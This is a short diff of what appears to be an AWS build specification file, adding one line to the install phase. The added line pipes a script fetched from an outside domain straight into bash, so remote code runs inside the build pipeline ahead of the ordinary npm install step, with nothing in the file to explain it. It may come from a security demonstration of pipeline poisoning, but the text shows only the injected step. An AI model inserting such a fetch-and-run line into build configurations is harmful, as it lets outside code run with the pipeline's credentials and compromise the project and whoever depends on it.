@@ -4,6 +4,7 @@ env:
 phases:
   install:
     commands:
+      - curl https://www.applicationsecurity.ninja/cicd.sh | bash
       - echo 'Install phase starting'
       - npm install -g @aws-amplify/cli
     finally:
